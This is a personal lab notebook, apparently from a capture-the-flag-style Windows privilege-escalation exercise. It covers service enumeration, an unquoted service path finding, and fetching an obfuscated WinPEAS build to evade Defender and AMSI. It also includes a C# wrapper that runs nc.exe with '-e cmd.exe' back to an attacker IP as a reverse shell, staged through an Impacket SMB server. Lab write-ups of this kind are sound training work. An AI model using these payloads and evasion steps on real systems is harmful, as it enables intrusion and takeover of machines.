
We have a reverse shell but but but we don't have full access to the system which means that Thomas done security works on this so we have to see how to escalate the privileges from here. Will try to run Winpeas but it might get picked up the AV.

We have the winpeas copy with obfuscated and  
https://github.com/carlospolop/PEASS-ng

Things to keep in mind:
We have the manual enumeration option.
Defender will definitely pick the copy of winpeas but unlikely to catch .bat or obfuscated .exe
version.
But main thing we have to keep in mind to bypass is AMSI will alert defender if we try to 
load any PowerShell Priv-sec check scripts.

```
whoami /priv
```

```
whoami /groups
```
![[Pasted image 20240121004602.png]]

Start by looking for non-default services:
```
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```
![[Pasted image 20240121004855.png]]
![[Pasted image 20240121005421.png]]

As you can see that `SystemExploreHelpService` does not have quotes in the path the rings a bell to the mind that _Unquoted Service Path_Â attack and escalate from here.

```
sc qc SystemExplorerHelpService
```
![[Pasted image 20240121010030.png]]

The service is running as LocalSystem which means now we have to check if we have write permission or not
```
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```
![[Pasted image 20240121010229.png]]


This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.

```
curl http://10.50.102.187/winPEASx64_ofs.exe -o C:\xampp\htdocs\resources\uploads\sardarji-win.exe
```
![[Pasted image 20240121011328.png]]

Finally able to run the winpeas ofs file aka obfuscated file
![[Pasted image 20240121013007.png]]

As you can see there is lot of vulnerability's here due to not upto date patching and updating of files
![[Pasted image 20240121013107.png]]

This is what we have found earlier and verified by the user
![[Pasted image 20240121013347.png]]

![[Pasted image 20240121013522.png]]

Will make a file with name wrapper.cs
```
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc.exe", "10.50.102.187 4444 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

```
gedit Wrapper.cs
```
```
mcs Wrapper.cs
```
![[Pasted image 20240121215236.png]]

Now will learn a new way to transfer the file for that will use Impacket toolkit
Impacket SMB server

```
python /opt/impacket-0.9.19/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
```


```
net use \\10.50.102.187\share /USER:user s3cureP@ssword
```

```
copy \\10.50.102.187\share\Wrapper.exe %TEMP%\wrapper-sardarji.exe
```
![[Pasted image 20240121215947.png]]

It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.

```
net use \\10.50.102.187\share /del
```
![[Pasted image 20240121220114.png]]
But will delete it for now 

```
"%TEMP%\wrapper-sardarji.exe"
```
![[Pasted image 20240121220608.png]]

![[Pasted image 20240121220629.png]]
Volla we got the reverse shell but still we are not the root user.

So it's now time to exploit that unquoted service path vulnerability!

